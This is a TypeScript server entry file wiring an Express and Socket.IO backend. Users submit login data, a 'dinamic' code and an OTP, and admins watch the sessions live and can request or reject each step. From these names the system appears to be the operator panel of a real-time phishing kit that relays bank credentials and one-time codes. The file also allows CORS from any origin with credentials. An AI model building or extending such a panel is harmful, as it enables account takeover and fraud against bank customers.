import "dotenv/config";
import express from "express";
import http from "http";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import { Server } from "socket.io";

import { PrismaSessionRepository } from "./adapters/outbound/db/PrismaSessionRepository.js";
import { JwtTokenService } from "./adapters/outbound/auth/JwtTokenService.js";
import { SocketIoGateway } from "./adapters/outbound/realtime/SocketIoGateway.js";

import { buildSocketAuthMiddleware } from "./adapters/inbound/ws/socketAuthMiddleware.js";
import { registerUserHandlers } from "./adapters/inbound/ws/handlers/UserHandlers.js";
import { registerAdminHandlers } from "./adapters/inbound/ws/handlers/AdminHandlers.js";

import { CreateSession } from "./core/application/usecases/CreateSession.js";
import { IssueUserToken } from "./core/application/usecases/IssueUserToken.js";
import { IssueAdminToken } from "./core/application/usecases/IssueAdminToken.js";
import { UserSubmitAuth } from "./core/application/usecases/UserSubmitAuth.js";
import { UserSubmitDinamic } from "./core/application/usecases/UserSubmitDinamic.js";
import { UserSubmitOtp } from "./core/application/usecases/UserSubmitOtp.js";
import { AdminRequestDinamic } from "./core/application/usecases/AdminRequestDinamic.js";
import { AdminRequestOtp } from "./core/application/usecases/AdminRequestOtp.js";
import { AdminRejectAuth } from "./core/application/usecases/AdminRejectAuth.js";
import { AdminRejectDinamic } from "./core/application/usecases/AdminRejectDinamic.js";
import { AdminRejectOtp } from "./core/application/usecases/AdminRejectOtp.js";
import { AdminBootstrap } from "./core/application/usecases/AdminBootstrap.js";

import { SessionsController } from "./adapters/inbound/http/controllers/SessionsController.js";
import { AdminController } from "./adapters/inbound/http/controllers/AdminController.js";
import { buildRoutes } from "./adapters/inbound/http/routes.js";
import { GetSession } from "./core/application/usecases/GetSession.js";
import { UserGetSession } from "./core/application/usecases/UserGetSession.js";

const PORT = Number(process.env.PORT || 3005);
const ORIGIN1 = process.env.LARAVEL_ORIGIN1 || "http://192.168.1.4:8000";
const ORIGIN2 = process.env.LARAVEL_ORIGIN2 || "http://192.168.1.4:8001";

const app = express();
app.use(express.json());
app.use(helmet());
app.use(rateLimit({ windowMs: 60_000, max: 120 }));
app.use(cors({ origin: "*", credentials: true }));

const httpServer = http.createServer(app);
const io = new Server(httpServer, {
  cors: { origin: [ORIGIN1, ORIGIN2], credentials: true },
});

// ---- Outbound adapters
const repo = new PrismaSessionRepository();
const tokens = new JwtTokenService(process.env.NODE_JWT_SECRET!);
const rt = new SocketIoGateway(io);

// ---- Use cases
const createSession = new CreateSession(repo, tokens, rt);
const getSession = new GetSession(repo);

const issueUserToken = new IssueUserToken(repo, tokens);
const issueAdminToken = new IssueAdminToken(
  tokens,
  process.env.LARAVEL_SHARED_SECRET || ""
);

/* admin */

const adminBootstrap = new AdminBootstrap(repo, rt);
const rejectAuth = new AdminRejectAuth(repo, rt);
const requestDinamic = new AdminRequestDinamic(repo, rt);
const rejectDinamic = new AdminRejectDinamic(repo, rt);
const requestOtp = new AdminRequestOtp(repo, rt);
const rejectOtp = new AdminRejectOtp(repo, rt);

/* user */
const submitAuth = new UserSubmitAuth(repo, rt);
const submitDinamic = new UserSubmitDinamic(repo, rt);
const submitOtp = new UserSubmitOtp(repo, rt);
const userGetSession = new UserGetSession(repo);

// ---- Controllers + routes
const sessionsController = new SessionsController(
  createSession,
  issueUserToken,
  getSession
);
const adminController = new AdminController(issueAdminToken);
app.use(buildRoutes({ sessions: sessionsController, admin: adminController }));

// ---- Socket auth middleware
io.use(buildSocketAuthMiddleware(tokens));

// ---- WS wiring
io.on("connection", async (socket) => {
  const auth = socket.data.auth;

  if (auth.role === "admin") {
    socket.join("admins");

     // ✅ cada vez que un admin inicia sesión / conecta
    await adminBootstrap.execute({ socketId: socket.id, limit: 200 });

    registerAdminHandlers(socket, {
      rejectAuth,
      requestDinamic,
      rejectDinamic,
      requestOtp,
      rejectOtp,
    });
  }

  if (auth.role === "user") {
    const sessionId = auth.sessionId;
    socket.join(`session:${sessionId}`);
    registerUserHandlers(socket, { submitAuth, submitDinamic, submitOtp, userGetSession });
  }
});

httpServer.listen(PORT,"0.0.0.0" ,() => console.log(`Backend running on http://localhost:${PORT}`));